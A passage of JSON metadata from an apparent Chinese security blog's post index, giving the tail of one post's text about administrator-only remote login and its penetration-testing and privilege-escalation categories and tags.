远程连接只允许管理员的那个账号登录(不是管理员就可以登录)","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"渗透思路","slug":"渗透测试/渗透思路","permalink":"http://www.daikersec.com/categories/渗透测试/渗透思路/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"提权","slug":"提权","permalink":"http://www.daikersec.com/tags/提权/"},{"name":"渗透","slug":"渗透","permalink":"http://www.daikersec.com/tags/渗透/"}]}]}